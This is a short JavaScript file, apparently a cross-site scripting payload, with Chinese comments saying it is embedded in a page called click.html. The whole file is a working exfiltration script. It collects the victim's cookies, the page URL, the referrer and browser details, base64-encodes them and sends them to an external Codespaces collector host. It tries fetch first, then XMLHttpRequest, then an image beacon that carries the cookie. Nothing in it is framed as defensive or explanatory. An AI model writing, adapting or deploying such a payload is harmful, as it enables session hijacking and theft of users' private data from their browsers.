// payload.js —— 挂在 click.html 里，采集后回传到 Codespaces collector
(function () {
  "use strict";

  // ===== 配置：collector 地址 =====
  var COLLECTOR = "https://glorious-space-train-77x4gqwwq49rhp769-3000.app.github.dev";

  // ===== 采集字段 =====
  var data = {
    t:        Date.now(),
    url:      location.href,
    referrer: document.referrer || "",
    cookie:   document.cookie   || "",
    ua:       navigator.userAgent,
    lang:     navigator.language || "",
    platform: navigator.platform || "",
    screen:   (screen.width || 0) + "x" + (screen.height || 0),
    origin:   location.origin
  };

  // ===== 编码：base64(JSON) =====
  function encode(obj) {
    var json = JSON.stringify(obj);
    if (typeof btoa !== "undefined") {
      return btoa(unescape(encodeURIComponent(json)));
    }
    return Buffer.from(json, "utf8").toString("base64");
  }

  var payload = encode(data);

  // ===== 方式1：fetch（现代浏览器）=====
  function byFetch() {
    try {
      fetch(COLLECTOR + "/collect", {
        method: "POST",
        headers: { "Content-Type": "text/plain;charset=UTF-8" },
        body: payload,
        mode: "no-cors",
        keepalive: true
      });
      return true;
    } catch (e) {
      return false;
    }
  }

  // ===== 方式2：XMLHttpRequest（兜底）=====
  function byXHR() {
    try {
      var r = new XMLHttpRequest();
      r.open("POST", COLLECTOR + "/collect", true);
      r.setRequestHeader("Content-Type", "text/plain;charset=UTF-8");
      r.send(payload);
      return true;
    } catch (e) {
      return false;
    }
  }

  // ===== 方式3：Image beacon（最后兜底，只带短字段）=====
  function byImage() {
    try {
      var img = new Image();
      img.src = COLLECTOR + "/ping?d=" + encodeURIComponent(
        btoa(JSON.stringify({ t: data.t, u: data.url, c: data.cookie }))
      );
      return true;
    } catch (e) {
      return false;
    }
  }

  // ===== 依次尝试 =====
  if (typeof fetch !== "undefined") {
    if (byFetch()) return;
  }
  if (byXHR()) return;
  byImage();
})();
